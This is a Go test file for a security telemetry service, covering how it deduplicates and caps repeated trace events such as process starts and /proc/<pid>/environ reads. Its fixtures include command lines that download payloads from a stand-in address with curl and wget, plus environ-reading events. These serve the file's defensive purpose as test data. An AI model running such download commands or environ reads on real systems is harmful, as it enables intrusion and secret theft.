package application

import (
	"context"
	"errors"
	"fmt"
	"strconv"
	"strings"
	"testing"
	"time"

	"github.com/wafio/wafio-cp-backend/internal/domain"
)

type repeatClock struct{ t time.Time }

func (c *repeatClock) now() time.Time { return c.t }

func (c *repeatClock) advance(d time.Duration) { c.t = c.t.Add(d) }

func newRepeatTestCap() (*traceRepeatCap, *repeatClock) {
	clock := &repeatClock{t: time.Date(2026, 11, 16, 10, 0, 0, 0, time.UTC)}
	return &traceRepeatCap{now: clock.now}, clock
}

// environRow is one open of another process's environ, the event that
// filled the database.
func environRow(pid int) domain.TraceEventRow {
	file := "/proc/" + strconv.Itoa(pid) + "/environ"
	return domain.TraceEventRow{
		PID: pid, EventName: "openat", Category: "file", Severity: 3, SeverityName: "high",
		Comm: "ps", ParentComm: "bash", Filename: file, Description: "read of " + file,
	}
}

// runRepeatBatch decides one batch and commits it, as an admitted batch does.
func runRepeatBatch(c *traceRepeatCap, agent string, rows ...domain.TraceEventRow) []domain.TraceEventRow {
	b := c.begin(agent, true)
	out := b.apply(rows, make([]string, len(rows)))
	b.finish(true)
	return out
}

func environRows(from, n int) []domain.TraceEventRow {
	rows := make([]domain.TraceEventRow, n)
	for i := range rows {
		rows[i] = environRow(from + i)
	}
	return rows
}

func countSummaries(rows []domain.TraceEventRow) (summaries int) {
	for _, r := range rows {
		if domain.IsTraceRepeatSummary(r.Description) {
			summaries++
		}
	}
	return
}

func TestTraceRepeatPathFoldsProcessIDs(t *testing.T) {
	for in, want := range map[string]string{
		"/proc/102/environ":          "/proc/*/environ",
		"/proc/1006/environ":         "/proc/*/environ",
		"/proc/self/environ":         "/proc/self/environ",
		"/proc/102/task/102/stat":    "/proc/*/task/*/stat",
		"/proc/102/fd/7":             "/proc/*/fd/*",
		"/proc/sys/kernel/pid_max":   "/proc/sys/kernel/pid_max",
		"/proc/12ab/environ":         "/proc/12ab/environ",
		"/proc/":                     "/proc/",
		"/tmp/102/environ":           "/tmp/102/environ",
		"/home/u/proc/102/environ":   "/home/u/proc/102/environ",
		"/etc/passwd":                "/etc/passwd",
		"":                           "",
		"/proc/102/environ/../1/cwd": "/proc/*/environ/../*/cwd",
	} {
		if got := traceRepeatPath(in); got != want {
			t.Errorf("traceRepeatPath(%q) = %q, want %q", in, got, want)
		}
	}
}

func TestTraceRepeatKey(t *testing.T) {
	base := environRow(102)
	key := func(r domain.TraceEventRow, rule string) string { return traceRepeatKeyOf(&r, rule) }

	if key(base, "") != key(environRow(1006), "") {
		t.Error("two process ids under /proc must share a key")
	}
	for name, mutate := range map[string]func(*domain.TraceEventRow){
		"event name":  func(r *domain.TraceEventRow) { r.EventName = "unlink" },
		"comm":        func(r *domain.TraceEventRow) { r.Comm = "top" },
		"parent comm": func(r *domain.TraceEventRow) { r.ParentComm = "zsh" },
		"severity":    func(r *domain.TraceEventRow) { r.Severity = 2 },
		"file":        func(r *domain.TraceEventRow) { r.Filename = "/proc/102/maps" },
	} {
		r := base
		mutate(&r)
		if key(r, "") == key(base, "") {
			t.Errorf("a different %s must not share a key", name)
		}
	}
	if key(base, "rule-a") == key(base, "rule-b") || key(base, "rule-a") == key(base, "") {
		t.Error("a different matched rule must not share a key")
	}
	// A field boundary cannot be forged by moving text between two fields.
	a, b := base, base
	a.Comm, a.ParentComm = "ab", "c"
	b.Comm, b.ParentComm = "a", "bc"
	if key(a, "") == key(b, "") {
		t.Error("comm and parent comm run together in the key")
	}

	// A network event keys on the address family and port, not the peer.
	conn := domain.TraceEventRow{EventName: "connect", Category: "network", Severity: 2, Comm: "curl", AddrFamily: 2, Port: 443, Addr: "10.0.0.1"}
	other := conn
	other.Addr = "10.0.0.2"
	if key(conn, "") != key(other, "") {
		t.Error("two peers on one port must share a key")
	}
	other.Port = 80
	if key(conn, "") == key(other, "") {
		t.Error("two ports must not share a key")
	}
	other = conn
	other.AddrFamily = 10
	if key(conn, "") == key(other, "") {
		t.Error("two address families must not share a key")
	}
}

// execRow is one process start with its command line.
func execRow(event, args string) domain.TraceEventRow {
	return domain.TraceEventRow{
		EventName: event, Category: "process", Severity: 3, SeverityName: "high",
		Comm: "bash", ParentComm: "sshd", Filename: "/usr/bin/curl", Args: args, Description: event + " " + args,
	}
}

func TestTraceRepeatKeyOfProcessEventsHoldsCommandLine(t *testing.T) {
	key := func(r domain.TraceEventRow) string { return traceRepeatKeyOf(&r, "") }
	if key(execRow("execve", "curl http://a/x")) == key(execRow("execve", "curl http://a/y")) {
		t.Error("two command lines share a key")
	}
	if key(execRow("execve", "curl http://a/x")) != key(execRow("execve", "curl http://a/x")) {
		t.Error("one command line has two keys")
	}
	if key(execRow("execveat", "curl http://a/x")) == key(execRow("execveat", "curl http://a/y")) {
		t.Error("execveat ignores its command line")
	}

	// Only the first 256 bytes count.
	long := strings.Repeat("a", traceRepeatArgsMax)
	if key(execRow("execve", long+"1")) != key(execRow("execve", long+"2")) {
		t.Errorf("bytes past %d are in the key", traceRepeatArgsMax)
	}
	if key(execRow("execve", long[:traceRepeatArgsMax-1]+"1")) == key(execRow("execve", long[:traceRepeatArgsMax-1]+"2")) {
		t.Error("the last kept byte is not in the key")
	}

	// A file event keeps its key: rename's Args is a path, not a command line.
	a, b := environRow(1), environRow(1)
	a.Args, b.Args = "x", "y"
	if key(a) != key(b) {
		t.Error("a file event keys on Args")
	}
}

func TestTraceRepeatDistinctCommandLinesAreAllStored(t *testing.T) {
	c, _ := newRepeatTestCap()
	rows := make([]domain.TraceEventRow, 0, 150)
	for i := range 100 {
		rows = append(rows, execRow("execve", "curl http://203.0.113.9/payload-"+strconv.Itoa(i)))
	}
	for i := range 50 {
		rows = append(rows, execRow("execveat", "wget http://203.0.113.9/tool-"+strconv.Itoa(i)))
	}
	before := TraceRepeatsDropped()
	if got := runRepeatBatch(c, "a1", rows...); len(got) != 150 {
		t.Fatalf("stored %d of 150 different command lines", len(got))
	}
	if TraceRepeatsDropped() != before {
		t.Error("a different command line was counted as a repeat")
	}
}

func TestTraceRepeatOneCommandLineIsCapped(t *testing.T) {
	c, clock := newRepeatTestCap()
	same := execRow("execve", "ps e")
	rows := make([]domain.TraceEventRow, 100)
	for i := range rows {
		rows[i] = same
		rows[i].PID = 3000 + i
	}
	// Different commands keep their rows next to the loop.
	rows = append(rows, execRow("execve", "id"), execRow("execve", "uname -a"))
	got := runRepeatBatch(c, "a1", rows...)
	var loop, other int
	for _, r := range got {
		if r.Args == "ps e" {
			loop++
		} else {
			other++
		}
	}
	if loop != traceRepeatMax || other != 2 {
		t.Fatalf("stored %d rows of the loop (want %d) and %d others (want 2)", loop, traceRepeatMax, other)
	}

	clock.advance(traceRepeatWindow)
	b := c.begin("a1", false)
	out := b.apply(nil, nil)
	b.finish(true)
	if len(out) != 1 || !strings.HasPrefix(out[0].Description, "[repeated 80 more times in 60 s, not stored] execve ps e") {
		t.Fatalf("summary %+v, want one for 80 repeats of the loop", out)
	}
}

func TestTraceRepeatStoresTwentyThenCounts(t *testing.T) {
	c, clock := newRepeatTestCap()
	before := TraceRepeatsDropped()

	// 15 rows, then 15 more with other process ids: 20 are stored in all.
	first := runRepeatBatch(c, "a1", environRows(100, 15)...)
	second := runRepeatBatch(c, "a1", environRows(200, 15)...)
	if len(first) != 15 || len(second) != 5 {
		t.Fatalf("stored %d then %d rows, want 15 then 5", len(first), len(second))
	}
	if countSummaries(first)+countSummaries(second) != 0 {
		t.Fatal("a summary was stored before its window ended")
	}
	if got := TraceRepeatsDropped() - before; got != 10 {
		t.Fatalf("dropped counter rose by %d, want 10", got)
	}

	// The window is still open 59 s in: still no summary, more rows dropped.
	clock.advance(59 * time.Second)
	third := runRepeatBatch(c, "a1", environRows(300, 3)...)
	if len(third) != 0 {
		t.Fatalf("stored %d rows inside a full window", len(third))
	}
}

func TestTraceRepeatSummaryRow(t *testing.T) {
	c, clock := newRepeatTestCap()
	rows := environRows(100, 27)
	rows[26].TID = 4242
	rows[26].EventID = "boot:1:2:3"
	lastTime := clock.t.Add(-time.Second)
	rows[26].EventTime = lastTime
	if got := runRepeatBatch(c, "a1", rows...); len(got) != 20 {
		t.Fatalf("stored %d rows, want 20", len(got))
	}

	// A batch with no events after the window flushes the summary.
	clock.advance(traceRepeatWindow)
	b := c.begin("a1", false)
	if b == nil {
		t.Fatal("agent state missing")
	}
	out := b.apply(nil, nil)
	b.finish(true)
	if len(out) != 1 {
		t.Fatalf("flush stored %d rows, want one summary", len(out))
	}
	s := out[0]
	if want := "[repeated 7 more times in 60 s, not stored] read of /proc/126/environ"; s.Description != want {
		t.Errorf("description %q, want %q", s.Description, want)
	}
	if s.TID != 4242 || s.EventTime != lastTime || s.Severity != 3 || s.SeverityName != "high" || s.Comm != "ps" || s.ParentComm != "bash" {
		t.Errorf("summary is not the last dropped row: %+v", s)
	}
	if s.EventID != "" {
		t.Errorf("summary kept event id %q of a row that was never stored", s.EventID)
	}
	if !domain.IsTraceRepeatSummary(s.Description) {
		t.Error("storage would sample the summary away")
	}

	// It is stored once: the next batch has nothing to flush.
	b = c.begin("a1", false)
	if again := b.apply(nil, nil); len(again) != 0 {
		t.Fatalf("summary flushed twice: %+v", again)
	}
	b.finish(true)
}

func TestTraceRepeatSummaryRidesNextBatchWithEvents(t *testing.T) {
	c, clock := newRepeatTestCap()
	runRepeatBatch(c, "a1", environRows(100, 22)...)
	clock.advance(traceRepeatWindow + time.Second)
	out := runRepeatBatch(c, "a1", environRows(500, 2)...)
	if len(out) != 3 || countSummaries(out) != 1 {
		t.Fatalf("got %d rows with %d summaries, want 2 new rows and one summary", len(out), countSummaries(out))
	}
	if !strings.HasPrefix(out[2].Description, "[repeated 2 more times in 60 s, not stored] ") {
		t.Fatalf("summary %q", out[2].Description)
	}
}

func TestTraceRepeatWindowRollsOver(t *testing.T) {
	c, clock := newRepeatTestCap()
	before := TraceRepeatsDropped()
	if got := runRepeatBatch(c, "a1", environRows(100, 25)...); len(got) != 20 {
		t.Fatalf("first window stored %d", len(got))
	}

	// The next window stores 20 again, and the first one's 5 become one row.
	clock.advance(traceRepeatWindow)
	got := runRepeatBatch(c, "a1", environRows(200, 25)...)
	if len(got) != 21 || countSummaries(got) != 1 {
		t.Fatalf("second window stored %d rows with %d summaries, want 20 + 1", len(got), countSummaries(got))
	}
	if !strings.HasPrefix(got[20].Description, "[repeated 5 more times in 60 s, not stored] ") {
		t.Fatalf("first summary %q", got[20].Description)
	}

	clock.advance(traceRepeatWindow)
	b := c.begin("a1", false)
	out := b.apply(nil, nil)
	b.finish(true)
	if len(out) != 1 || !strings.HasPrefix(out[0].Description, "[repeated 5 more times in 60 s, not stored] ") {
		t.Fatalf("second summary %+v", out)
	}
	if got := TraceRepeatsDropped() - before; got != 10 {
		t.Fatalf("dropped counter rose by %d, want 10", got)
	}

	// With nothing left to flush the agent state holds no keys.
	b = c.begin("a1", false)
	b.apply(nil, nil)
	b.finish(true)
	if n := len(c.agents["a1"].keys); n != 0 {
		t.Fatalf("%d keys survive two idle windows", n)
	}
}

func TestTraceRepeatNeverCapsRareClasses(t *testing.T) {
	c, _ := newRepeatTestCap()
	enforced := environRow(1)
	enforced.Action, enforced.ActionName = 2, "kill"
	critical := environRow(1)
	critical.Severity, critical.SeverityName = 4, "critical"
	outcome := environRow(1)
	outcome.OutcomeUpdate = true
	lost := domain.TraceEventRow{EventName: domain.TraceEventsLostName, Category: "security", Severity: 3, SeverityName: "high", Comm: "agent"}
	shed := domain.TraceEventRow{EventName: domain.TraceEventsShedName, Category: "security", Severity: 1, SeverityName: "low", Comm: "agent"}

	before := TraceRepeatsDropped()
	for name, row := range map[string]domain.TraceEventRow{
		"enforcement action": enforced, "critical": critical, "outcome update": outcome,
		"loss report": lost, "shed report": shed,
	} {
		rows := make([]domain.TraceEventRow, 100)
		for i := range rows {
			rows[i] = row
		}
		if got := runRepeatBatch(c, "a1", rows...); len(got) != 100 {
			t.Errorf("%s: stored %d of 100 rows", name, len(got))
		}
	}
	if TraceRepeatsDropped() != before {
		t.Error("an exempt row was counted as dropped")
	}
	if n := len(c.agents["a1"].keys); n != 0 {
		t.Errorf("exempt rows created %d keys", n)
	}
}

func TestTraceRepeatKeyCap(t *testing.T) {
	c, _ := newRepeatTestCap()
	distinct := func(n int) []domain.TraceEventRow {
		rows := make([]domain.TraceEventRow, n)
		for i := range rows {
			rows[i] = environRow(1)
			rows[i].Filename = fmt.Sprintf("/var/lib/app/file-%d", i)
		}
		return rows
	}
	// Each key is seen once: all stored, and only traceRepeatKeysMax tracked.
	if got := runRepeatBatch(c, "a1", distinct(traceRepeatKeysMax+50)...); len(got) != traceRepeatKeysMax+50 {
		t.Fatalf("stored %d rows of %d distinct keys", len(got), traceRepeatKeysMax+50)
	}
	if n := len(c.agents["a1"].keys); n != traceRepeatKeysMax {
		t.Fatalf("%d keys tracked, want the cap %d", n, traceRepeatKeysMax)
	}

	// A tracked key is capped, an untracked one stored without counting.
	tracked, untracked := distinct(1), distinct(traceRepeatKeysMax + 50)[traceRepeatKeysMax+49]
	rows := make([]domain.TraceEventRow, 0, 60)
	for range 30 {
		rows = append(rows, tracked[0], untracked)
	}
	got := runRepeatBatch(c, "a1", rows...)
	var gotTracked, gotUntracked int
	for _, r := range got {
		if r.Filename == untracked.Filename {
			gotUntracked++
		} else {
			gotTracked++
		}
	}
	if gotTracked != traceRepeatMax-1 || gotUntracked != 30 {
		t.Fatalf("tracked key stored %d (want %d, one was stored above), untracked %d (want 30)", gotTracked, traceRepeatMax-1, gotUntracked)
	}
}

func TestTraceRepeatKeyCapFreesWithWindow(t *testing.T) {
	c, clock := newRepeatTestCap()
	rows := make([]domain.TraceEventRow, traceRepeatKeysMax)
	for i := range rows {
		rows[i] = environRow(1)
		rows[i].Filename = "/var/lib/app/" + strconv.Itoa(i)
	}
	runRepeatBatch(c, "a1", rows...)
	clock.advance(traceRepeatWindow)

	// The old keys are forgotten in the batch that starts the next window,
	// so a new key is tracked again.
	extra := environRows(1, 25)
	for i := range extra {
		extra[i].Comm = "new-tool"
	}
	if got := runRepeatBatch(c, "a1", extra...); len(got) != traceRepeatMax {
		t.Fatalf("stored %d rows of a new key after the window, want %d", len(got), traceRepeatMax)
	}
}

func TestTraceRepeatAgentsAreIndependent(t *testing.T) {
	c, _ := newRepeatTestCap()
	if got := runRepeatBatch(c, "a1", environRows(100, 30)...); len(got) != 20 {
		t.Fatalf("a1 stored %d", len(got))
	}
	if got := runRepeatBatch(c, "a2", environRows(100, 30)...); len(got) != 20 {
		t.Fatalf("a2 stored %d, want its own 20", len(got))
	}
}

func TestTraceRepeatRejectedBatchCountsOnce(t *testing.T) {
	c, _ := newRepeatTestCap()
	before := TraceRepeatsDropped()
	for range 3 {
		rows := environRows(100, 25)
		b := c.begin("a1", true)
		if got := b.apply(rows, make([]string, len(rows))); len(got) != 20 {
			t.Fatalf("attempt stored %d, want 20", len(got))
		}
		b.finish(false) // the queue was full: the agent sends the batch again
	}
	if TraceRepeatsDropped() != before {
		t.Fatal("a rejected batch moved the dropped counter")
	}
	if got := runRepeatBatch(c, "a1", environRows(100, 25)...); len(got) != 20 {
		t.Fatalf("admitted retry stored %d, want 20 (rejected attempts must not use the window)", len(got))
	}
	if got := TraceRepeatsDropped() - before; got != 5 {
		t.Fatalf("dropped counter rose by %d, want 5", got)
	}
}

func TestTraceRepeatDropsIdleAgents(t *testing.T) {
	c, clock := newRepeatTestCap()
	runRepeatBatch(c, "gone", environRows(100, 25)...)
	runRepeatBatch(c, "kept", environRows(100, 25)...)

	clock.advance(traceRepeatIdle - time.Minute)
	runRepeatBatch(c, "kept", environRows(200, 1)...)
	clock.advance(2 * time.Minute)
	runRepeatBatch(c, "other", environRows(100, 1)...) // any batch runs the sweep

	if _, ok := c.agents["gone"]; ok {
		t.Error("an agent silent past the idle time keeps its state")
	}
	if _, ok := c.agents["kept"]; !ok {
		t.Error("an agent with a recent batch lost its state")
	}
}

func TestTraceRepeatKeepsAgentWithBatchInProgress(t *testing.T) {
	c, clock := newRepeatTestCap()
	b := c.begin("busy", true)
	clock.advance(2 * traceRepeatIdle)
	runRepeatBatch(c, "other", environRows(1, 1)...)
	if _, ok := c.agents["busy"]; !ok {
		t.Fatal("the sweep dropped an agent whose batch was in progress")
	}
	b.finish(false)
}

func TestTraceRepeatFinishIsIdempotent(t *testing.T) {
	c, _ := newRepeatTestCap()
	b := c.begin("a1", true)
	b.finish(true)
	b.finish(false) // a deferred guard after the real finish
	// The agent lock is free again.
	runRepeatBatch(c, "a1", environRows(1, 1)...)
	var none *traceRepeatBatch
	none.finish(true)
	if got := none.apply(environRows(1, 2), []string{"", ""}); len(got) != 2 {
		t.Fatal("a nil batch must pass rows through")
	}
}

// The ingest path: rule hits and incidents count every event, the store
// gets the capped rows, and an idle batch flushes the summary.
func TestIngestCapsRepeatedTraceEvents(t *testing.T) {
	c, clock := newRepeatTestCap()
	store := &fakeTelemetryStore{projectID: "p-cap", hostID: "h"}
	rules := &fakeRules{rules: []domain.DetectionRule{{ID: "tagged", Enabled: true, Action: domain.RuleActionTag,
		Tags: []string{"seen"}, Conditions: []domain.RuleCondition{{Field: "comm", Op: "eq", Value: "ps"}}}}}
	incidents := &countingIncidents{}
	svc := &HostTelemetryIngest{Telemetry: store, Hosts: fakeHeartbeats{}, Rules: rules, Incidents: incidents, repeats: c}

	events := make([]TraceEventPayload, 30)
	for i := range events {
		events[i] = TraceEventPayload{
			Timestamp: clock.t.Format(time.RFC3339Nano), PID: 100 + i, EventName: "unlink", Category: "file",
			Severity: 3, SeverityName: "high", Comm: "ps", ParentComm: "bash",
			Filename: "/proc/" + strconv.Itoa(100+i) + "/environ", Description: "unlink " + strconv.Itoa(i),
		}
	}
	ctx := context.Background()
	before := TraceRepeatsDropped()
	if err := svc.IngestDecoded(ctx, "p-cap", "agent-cap", "", &HostTelemetryPayload{TraceEvents: events}); err != nil {
		t.Fatal(err)
	}
	if len(store.traceRows) != 20 {
		t.Fatalf("stored %d rows, want 20", len(store.traceRows))
	}
	if rules.hits["tagged"] != 30 {
		t.Fatalf("rule hits %v, want all 30 events counted", rules.hits)
	}
	if len(incidents.counts) != 1 || incidents.counts[0] != 30 {
		t.Fatalf("incident counts %v, want one incident of 30 events", incidents.counts)
	}
	if got := TraceRepeatsDropped() - before; got != 10 {
		t.Fatalf("dropped counter rose by %d, want 10", got)
	}

	// An idle agent's batch, a window later, stores the summary.
	clock.advance(traceRepeatWindow)
	store.traceRows = nil
	if err := svc.IngestDecoded(ctx, "p-cap", "agent-cap", "", &HostTelemetryPayload{}); err != nil {
		t.Fatal(err)
	}
	if len(store.traceRows) != 1 || !strings.HasPrefix(store.traceRows[0].Description, "[repeated 10 more times in 60 s, not stored] ") {
		t.Fatalf("idle batch stored %+v, want one summary of 10", store.traceRows)
	}
	store.traceRows = nil
	if err := svc.IngestDecoded(ctx, "p-cap", "agent-cap", "", &HostTelemetryPayload{}); err != nil {
		t.Fatal(err)
	}
	if len(store.traceRows) != 0 {
		t.Fatalf("summary stored twice: %+v", store.traceRows)
	}
}

// A batch the store rejects is sent again: the cap must not have counted it.
func TestIngestRejectedTraceBatchDoesNotUseTheWindow(t *testing.T) {
	c, clock := newRepeatTestCap()
	store := &fakeTelemetryStore{projectID: "p-cap", hostID: "h"}
	svc := &HostTelemetryIngest{Telemetry: store, Hosts: fakeHeartbeats{}, Rules: &fakeRules{}, Incidents: &fakeIncidents{}, repeats: c}
	reject := true
	svc.traceAdmission = func(ctx context.Context, agentID string, rows []domain.TraceEventRow) error {
		if reject {
			return errors.New("queue full")
		}
		return store.InsertTraceEvents(ctx, agentID, rows)
	}
	events := make([]TraceEventPayload, 25)
	for i := range events {
		events[i] = TraceEventPayload{
			Timestamp: clock.t.Format(time.RFC3339Nano), EventName: "unlink", Category: "file",
			Severity: 3, SeverityName: "high", Comm: "ps", Filename: "/proc/" + strconv.Itoa(i+1) + "/environ",
		}
	}
	ctx := context.Background()
	for range 3 {
		if err := svc.IngestDecoded(ctx, "p-cap", "agent-rej", "", &HostTelemetryPayload{TraceEvents: events}); err == nil {
			t.Fatal("rejected batch reported success")
		}
	}
	reject = false
	if err := svc.IngestDecoded(ctx, "p-cap", "agent-rej", "", &HostTelemetryPayload{TraceEvents: events}); err != nil {
		t.Fatal(err)
	}
	if len(store.traceRows) != 20 {
		t.Fatalf("stored %d rows after the retry, want 20", len(store.traceRows))
	}
}

type countingIncidents struct{ counts []int64 }

func (c *countingIncidents) Upsert(_ context.Context, _ domain.HostIncident, count int64) error {
	c.counts = append(c.counts, count)
	return nil
}
